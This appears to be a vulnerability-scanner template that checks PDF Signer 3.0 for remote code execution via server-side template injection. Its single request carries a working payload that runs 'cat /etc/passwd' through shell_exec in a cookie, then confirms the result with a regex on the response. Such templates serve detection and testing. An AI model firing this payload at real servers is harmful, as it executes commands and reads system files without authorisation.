id: pdf-signer-ssti-to-rce

info:
  name: PDF Signer 3.0 - Remote Code Execution
  author: madrobot
  severity: high
  description: PDF Signer 3.0 is susceptible to remote code execution via server-side template injection, due to  improper cookie handling and improper CSRF implementation. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
  tags: ssti,rce,csrf

requests:
  - method: GET
    path:
      - "{{BaseURL}}"
    headers:
      Cookie: "CSRF-TOKEN=rnqvt{{shell_exec('cat /etc/passwd')}}to5gw; simcify=uv82sg0jj2oqa0kkr2virls4dl"

    skip-variables-check: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "root:.*:0:0:"
        part: body

# Enhanced by md on 2022/10/05
